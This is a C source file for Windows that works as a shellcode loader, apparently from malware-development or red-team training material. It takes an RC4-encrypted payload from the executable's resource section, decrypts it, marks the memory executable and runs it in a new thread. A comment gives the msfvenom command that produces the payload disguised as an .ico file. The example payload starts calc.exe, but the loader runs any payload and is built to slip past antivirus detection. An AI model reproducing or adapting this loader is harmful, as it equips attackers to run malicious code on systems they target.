#include <stdio.h>
#include <windows.h>
#include "resource.h"
#include "Encryption.h"

// For the payload generation as ico file
// msfvenom -p windows/x64/exec CMD="calc.exe" -f raw > shell.ico

// Add Resource file

// RC4 Key
unsigned char key[] = { 0x61, 0x66, 0x21 };

// main function
int main() {
	DWORD oldProtect = NULL;

	// Locates the specified resource in the `.rsrc` section using its unique ID (IDR_RCDATA1)
	HRSRC hResource = FindResource(NULL, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
	if (hResource == NULL) {
		printf("[!] FindResource failed\n");
		return 1;
	}

	// Retrieves a handle to the resource data, allowing access to its contents
	HGLOBAL hResourceData = LoadResource(NULL, hResource);
	if (hResourceData == NULL) {
		printf("[!] LoadResource failed\n");
		return 1;
	}

	// Provides a pointer to the resource data using the handle
	PVOID pShellcodeAddress = LockResource(hResourceData);
	if (pShellcodeAddress == NULL) {
		printf("[!] LockResource failed\n");
		return 1;
	}

	// Returns the size of the resource data
	SIZE_T shellcodeSize = SizeofResource(NULL, hResource);
	if (shellcodeSize == NULL) {
		printf("[!] SizeofResource failed\n");
		return 1;
	}

	// Show the results
	printf("[+] Shellcode address: 0x%p\n", pShellcodeAddress);
	printf("[+] Shellcode size: %d\n", shellcodeSize);

	//  Allocates memory which will be used to store the payload
	PVOID pAllocatedAddress = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAllocatedAddress == NULL) {
		printf("[!] VirtualAlloc failed with error: %d\n", GetLastError());
		return 1;
	}

	// Show the results
	printf("[+] Allocated address: 0x%p\n\n", pAllocatedAddress);

	// Copy the shellcode to the allocated memory
	memcpy(pAllocatedAddress, pShellcodeAddress, shellcodeSize);

	// Decrypt the shellcode
	Rc4EncryptionViaSystemFunc032(key, (PBYTE)pAllocatedAddress, sizeof(key), shellcodeSize);

	// Change the memory protection of the allocated memory to PAGE_EXECUTE_READ
	BOOL bProtect = VirtualProtect((PBYTE)pAllocatedAddress, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
	if (bProtect == 0) {
		printf("[!] VirtualProtect failed with error: %d\n", GetLastError());
		return 1;
	}

	// Pause the program
	printf("[~] Press any key to continue...\n");
	getchar();

	// Create a new thread to execute the shellcode
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pAllocatedAddress, NULL, 0, NULL);
	if (hThread == NULL) {
		printf("[!] CreateThread failed with error: %d\n", GetLastError());
		return 1;
	}

	// Print the thread handle
	printf("[+] Thread created with handle: 0x%p\n\n", hThread);

	// Wait for the thread to complete
	WaitForSingleObject(hThread, -1);
	CloseHandle(hThread);

	return 0;
}
